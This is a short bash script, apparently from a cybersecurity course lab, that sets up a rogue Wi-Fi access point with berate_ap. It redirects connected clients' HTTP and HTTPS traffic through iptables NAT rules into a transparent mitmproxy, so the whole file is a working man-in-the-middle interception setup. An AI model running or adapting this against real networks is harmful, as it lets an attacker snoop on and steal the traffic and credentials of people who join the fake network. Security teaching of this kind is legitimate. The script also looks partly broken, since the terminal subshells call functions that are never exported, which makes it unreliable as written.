#!/bin/bash

# Ensure the script is run as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit
fi

# Install mitmproxy if not installed
if ! command -v mitmproxy &> /dev/null
then
  apt-get update
  apt-get install -y mitmproxy
fi

# Function to start the rogue AP
start_rogue_ap() {
  echo "Starting rogue AP..."
  sudo ./berate_ap wlan1 wlan0 COMP4030-Cybersecurity-Wifi-Test
}

# Function to setup iptables and start MITM proxy
start_mitmproxy() {
  echo "Setting up iptables rules..."
  sudo iptables -t nat -A PREROUTING -i ap0 -p tcp --dport 80 -j REDIRECT --to-port 8080
  sudo iptables -t nat -A PREROUTING -i ap0 -p tcp --dport 443 -j REDIRECT --to-port 8080

  echo "Starting mitmproxy..."
  sudo mitmproxy --mode transparent --showhost
}

# Open new terminal for rogue AP
gnome-terminal -- bash -c "cd berate_ap && start_rogue_ap; exec bash"

# Open new terminal for MITM proxy
gnome-terminal -- bash -c "start_mitmproxy; exec bash"
